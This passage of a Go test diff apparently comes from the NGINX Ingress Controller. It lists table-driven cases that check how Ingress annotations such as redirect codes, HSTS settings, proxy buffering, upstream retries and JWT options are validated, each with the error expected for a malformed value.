+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/http-redirect-code: Required value`,
+			},
+			msg: "invalid nginx.org/http-redirect-code annotation, empty string",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "200",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/http-redirect-code: Invalid value: "200": status code out of accepted range. accepted values are '301', '302', '307', '308'`,
+			},
+			msg: "invalid nginx.org/http-redirect-code annotation, invalid code",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "invalid",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/http-redirect-code: Invalid value: "invalid": invalid redirect code: strconv.Atoi: parsing "invalid": invalid syntax`,
+			},
+			msg: "invalid nginx.org/http-redirect-code annotation, not a number",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-buffering": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-buffering annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-buffering": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-buffering: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid nginx.org/proxy-buffering annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/http2": "false",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/http2 annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http2": "on",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/http2: Invalid value: "on": must be a boolean`,
+			},
+			msg: "invalid nginx.org/http2 annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/hsts annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/hsts: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid nginx.org/hsts annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts":         "true",
+				"nginx.org/hsts-max-age": "120",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/hsts-max-age annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts":         "false",
+				"nginx.org/hsts-max-age": "120",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/hsts-max-age nginx.org/hsts can be false",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts":         "true",
+				"nginx.org/hsts-max-age": "not_a_number",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/hsts-max-age: Invalid value: "not_a_number": must be an integer`,
+			},
+			msg: "invalid nginx.org/hsts-max-age, must be a number",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts-max-age": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/hsts-max-age: Forbidden: related annotation nginx.org/hsts: must be set",
+			},
+			msg: "invalid nginx.org/hsts-max-age, related annotation nginx.org/hsts not set",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts":                    "true",
+				"nginx.org/hsts-include-subdomains": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/hsts-include-subdomains annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts":                    "false",
+				"nginx.org/hsts-include-subdomains": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/hsts-include-subdomains, nginx.org/hsts can be false",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts":                    "true",
+				"nginx.org/hsts-include-subdomains": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/hsts-include-subdomains: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid nginx.org/hsts-include-subdomains, must be a boolean",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts-include-subdomains": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/hsts-include-subdomains: Forbidden: related annotation nginx.org/hsts: must be set",
+			},
+			msg: "invalid nginx.org/hsts-include-subdomains, related annotation nginx.org/hsts not set",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts":              "true",
+				"nginx.org/hsts-behind-proxy": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/hsts-behind-proxy annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts":              "false",
+				"nginx.org/hsts-behind-proxy": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/hsts-behind-proxy, nginx.org/hsts can be false",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts":              "true",
+				"nginx.org/hsts-behind-proxy": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/hsts-behind-proxy: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid nginx.org/hsts-behind-proxy, must be a boolean",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/hsts-behind-proxy": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/hsts-behind-proxy: Forbidden: related annotation nginx.org/hsts: must be set",
+			},
+			msg: "invalid nginx.org/hsts-behind-proxy, related annotation nginx.org/hsts not set",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-buffers": "8 8k",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-buffers annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-buffers": "not_a_proxy_buffers_spec",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-buffers: Invalid value: "not_a_proxy_buffers_spec": must be a proxy buffer spec`,
+			},
+			msg: "invalid nginx.org/proxy-buffers annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-buffer-size": "16k",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-buffer-size annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-buffer-size": "not_a_size",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-buffer-size: Invalid value: "not_a_size": must consist of numeric characters followed by a valid size suffix. 'k|K|m|M (e.g. '16',  or '32k',  or '64M', regex used for validation is '\d+[kKmM]?')`,
+			},
+			msg: "invalid nginx.org/proxy-buffer-size annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-max-temp-file-size": "128M",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/proxy-max-temp-file-size annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/proxy-max-temp-file-size": "not_a_size",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-max-temp-file-size: Invalid value: "not_a_size": must consist of numeric characters followed by a valid size suffix. 'k|K|m|M (e.g. '16',  or '32k',  or '64M', regex used for validation is '\d+[kKmM]?')`,
+			},
+			msg: "invalid nginx.org/proxy-max-temp-file-size annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamAnnotation: "error timeout http_502 http_503",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "valid " + configs.ProxyNextUpstreamAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamAnnotation: "error      timeout http_502 http_503",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "valid " + configs.ProxyNextUpstreamAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamAnnotation: "denied",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamAnnotation + `: Invalid value: "denied": must be a space-separated list with any of the following values: error, http_403, http_404, http_429, http_500, http_502, http_503, http_504, invalid_header, non_idempotent, off, timeout`,
+			},
+			msg: "Plus Only " + configs.ProxyNextUpstreamAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamAnnotation: "invalid_value",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamAnnotation + `: Invalid value: "invalid_value": must be a space-separated list with any of the following values: error, http_403, http_404, http_429, http_500, http_502, http_503, http_504, invalid_header, non_idempotent, off, timeout`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamAnnotation: "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamAnnotation + `: Required value`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTimeoutAnnotation: "0",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "valid " + configs.ProxyNextUpstreamTimeoutAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTimeoutAnnotation: "123",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "valid " + configs.ProxyNextUpstreamTimeoutAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTimeoutAnnotation: "-123",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTimeoutAnnotation + `: Invalid value: "-123": must be a time`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTimeoutAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTimeoutAnnotation: "abc",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTimeoutAnnotation + `: Invalid value: "abc": must be a time`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTimeoutAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTimeoutAnnotation: "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTimeoutAnnotation + `: Required value`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTimeoutAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTriesAnnotation: "0",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "valid " + configs.ProxyNextUpstreamTriesAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTriesAnnotation: "123",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "valid " + configs.ProxyNextUpstreamTriesAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTriesAnnotation: "-123",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTriesAnnotation + `: Invalid value: "-123": must be a non-negative integer`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTriesAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTriesAnnotation: "abc",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTriesAnnotation + `: Invalid value: "abc": must be a non-negative integer`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTriesAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTriesAnnotation: "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTriesAnnotation + `: Required value`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTriesAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamAnnotation: "error timeout http_502 http_503",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "valid " + configs.ProxyNextUpstreamAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamAnnotation: "invalid_value",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamAnnotation + `: Invalid value: "invalid_value": must be a space-separated list with any of the following values: denied, error, http_403, http_404, http_429, http_500, http_502, http_503, http_504, invalid_header, non_idempotent, off, timeout`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamAnnotation: "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamAnnotation + `: Required value`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamAnnotation: "denied",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "Plus Only " + configs.ProxyNextUpstreamAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTimeoutAnnotation: "0",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "valid " + configs.ProxyNextUpstreamTimeoutAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTimeoutAnnotation: "123",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "valid " + configs.ProxyNextUpstreamTimeoutAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTimeoutAnnotation: "-123",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTimeoutAnnotation + `: Invalid value: "-123": must be a time`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTimeoutAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTimeoutAnnotation: "abc",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTimeoutAnnotation + `: Invalid value: "abc": must be a time`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTimeoutAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTimeoutAnnotation: "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTimeoutAnnotation + `: Required value`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTimeoutAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTriesAnnotation: "0",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "valid " + configs.ProxyNextUpstreamTriesAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTriesAnnotation: "123",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			msg:                 "valid " + configs.ProxyNextUpstreamTriesAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTriesAnnotation: "-123",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTriesAnnotation + `: Invalid value: "-123": must be a non-negative integer`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTriesAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTriesAnnotation: "abc",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTriesAnnotation + `: Invalid value: "abc": must be a non-negative integer`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTriesAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyNextUpstreamTriesAnnotation: "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.` + configs.ProxyNextUpstreamTriesAnnotation + `: Required value`,
+			},
+			msg: "invalid " + configs.ProxyNextUpstreamTriesAnnotation + " annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/upstream-zone-size": "512k",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors:      nil,
+			msg:                 "valid nginx.org/upstream-zone-size annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/upstream-zone-size": "not a size",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			directiveAutoAdjust: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/upstream-zone-size: Invalid value: "not a size": must consist of numeric characters followed by a valid size suffix. 'k|K|m|M (e.g. '16',  or '32k',  or '64M', regex used for validation is '\d+[kKmM]?')`,
+			},
+			msg: "invalid nginx.org/upstream-zone-size annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTRealmAnnotation: "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf("annotations.%s: Forbidden: annotation requires NGINX Plus", configs.JWTRealmAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, nginx plus only", configs.JWTRealmAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTRealmAnnotation: "my-jwt-realm",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            fmt.Sprintf("valid %s annotation", configs.JWTRealmAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTRealmAnnotation: "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf("annotations.%s: Required value", configs.JWTRealmAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, empty", configs.JWTRealmAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTRealmAnnotation: "realm$1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "realm$1": a valid annotation value must have all '"' escaped and must not contain any '$' or end with an unescaped '\' (e.g. 'My Realm',  or 'Cafe App', regex used for validation is '([^"$\\]|\\[^$])*')`, configs.JWTRealmAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation with special character '$'", configs.JWTRealmAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTKeyAnnotation: "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf("annotations.%s: Forbidden: annotation requires NGINX Plus", configs.JWTKeyAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, nginx plus only", configs.JWTKeyAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTKeyAnnotation: "my-jwk",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            fmt.Sprintf("valid %s annotation", configs.JWTKeyAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTKeyAnnotation: "my_jwk",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "my_jwk": a lowercase RFC 1123 subdomain must consist of lower case alphanumeric characters, '-' or '.', and must start and end with an alphanumeric character (e.g. 'example.com', regex used for validation is '[a-z0-9]([-a-z0-9]*[a-z0-9])?(\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*')`, configs.JWTKeyAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, containing '_'", configs.JWTKeyAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTTokenAnnotation: "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf("annotations.%s: Forbidden: annotation requires NGINX Plus", configs.JWTTokenAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, nginx plus only", configs.JWTTokenAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTTokenAnnotation: "$cookie_auth_token",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            fmt.Sprintf("valid %s annotation", configs.JWTTokenAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTTokenAnnotation: "cookie_auth_token",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "cookie_auth_token": %s`, configs.JWTTokenAnnotation, jwtTokenValueFmtErrMsg),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, '$' missing", configs.JWTTokenAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTTokenAnnotation: `$cookie_auth_token"`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "$cookie_auth_token\"": %s`, configs.JWTTokenAnnotation, jwtTokenValueFmtErrMsg),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, containing unescaped '\"'", configs.JWTTokenAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTTokenAnnotation: `$cookie_auth_token\`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
